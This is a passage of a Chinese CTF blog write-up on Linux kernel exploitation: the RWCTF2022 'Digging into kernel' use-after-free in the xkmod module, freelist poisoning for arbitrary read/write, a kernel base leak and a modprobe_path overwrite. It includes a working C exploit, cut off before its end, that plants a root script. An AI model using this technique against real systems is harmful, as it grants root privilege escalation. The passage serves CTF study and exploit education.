<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure>
<p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p>
<p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p>
<p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p>
<p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p>
<p>当释放一个密钥时</p>
<p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p>
<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><h1 id="RWCTF2022-高校赛-Digging-into-kernel-1-amp-2"><a href="#RWCTF2022-高校赛-Digging-into-kernel-1-amp-2" class="headerlink" title="RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2"></a>RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic</span><br></pre></td></tr></table></figure>
<p>开启了smap,smep</p>
<p>又可以发现开启了kpti</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure>
<p>这个题目给的cpio中并没有init脚本</p>
<p>不过可以发现 <code>xkmod.ko</code> ，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析。</p>
<p>在模块载入时会新建一个 kmem_cache 叫 <code>&quot;lalala&quot;</code>，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align(对齐),flags(标志位),ctor(构造函数)，由于没有设置 <code>SLAB_ACCOUNT</code> 标志位故该 <code>kmem_cache</code> <strong>会默认与 kmalloc-192 合并</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其他的主要就是实现了ioctl,以及在关闭文件时会释放object</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;v3, a3, <span class="number">16LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">107374182</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v4, v3, (<span class="type">int</span>)v5);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">125269879</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">17895697</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_to_user(v3, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v4);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作<strong>都没有上锁</strong>。</p>
<p>漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，<strong>只要我们同时打开多个设备文件便能完成 UAF</strong>。</p>
<p>需要的结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>首先因为uaf的存在,我们能够泄露一个object释放之后的内容</p>
<p>而kmem_cache的offset成员,决定了一个obj释放后的next指针位置</p>
<p>这里经过测试可以前八个字节就是一个内核地址,但是每次的页内偏移不同</p>
<p>由此可以知道</p>
<ol>
<li><code>offset==0</code></li>
<li>开启了RANDOM_FREELIST 保护</li>
<li>没有开启HARDENED_FREELIST保护</li>
</ol>
<p>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着后进先出的原则</strong>，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配<strong>便能够成功获得目标地址上的 object ，实现任意地址读写</strong>。</p>
<p>但这么做有着一个小问题，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 <strong>NULL 指针</strong>，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。</p>
<h3 id="泄露基址"><a href="#泄露基址" class="headerlink" title="泄露基址"></a>泄露基址</h3><p>接下来我们考虑如何泄露内核基址，虽然题目新建的 <code>kmem_cache</code> 会默认与 <code>kmalloc-192</code> 合并，但为了还原出题人原始意图，我们还是将其当作一个独立的 <code>kmem_cache</code> 来完成利用。</p>
<p>在内核 “堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64(0xffffffff81000030)</code> 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p>
<p>若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址。</p>
<h3 id="修改modprobe-path以root执行程序"><a href="#修改modprobe-path以root执行程序" class="headerlink" title="修改modprobe_path以root执行程序"></a>修改modprobe_path以root执行程序</h3><p>接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 <code>n_tty_ops</code>）来劫持内核执行流，这里选择覆写 <code>modprobe_path</code> 从而以 root 执行程序。</p>
<p>当我们尝试去执行(execve)一个非法的文件(file magic not found,即文件格式头错误)，内核会经历如下调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure>
<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码 5.14）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    argv[<span class="number">0</span>] = modprobe_path;<span class="comment">//argv[0]即运行程序名</span></span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = module_name;  <span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code>。</p>
<p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong>。</p>
<p>modprobe_path的地址可以由符号名直接搜索到</p>
<p>但是有些vmlinux似乎去除了这个符号</p>
<p>这个时候就可以通过搜索modprobe_path的初始符号值<code>/sbin/modprobe</code>寻找</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-27_230748.png" alt=""></p>
<p>例如本题最终底下那个就是modprobe的地址,最顶上那个对应直接映射区</p>
<p>又或者在<code>/proc/kallsyms</code>文件夹下找</p>
<p><code>grep modprobe_path /proc/kallsyms</code></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>流程就是利用uaf写一个obj的next指针</p>
<p>首先泄露page_offset_base进而再次泄露page_offset_base+0x9d000处的内核函数指针</p>
<p>从而得到内核映射基址</p>
<p>然后uaf写modprobe_path为创建的利用程序路径</p>
<p>最后打开一个非法文件触发利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bindCore</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">allocBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    editBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;<span class="comment">//直接映射区的后28位一般是0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        errExit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span 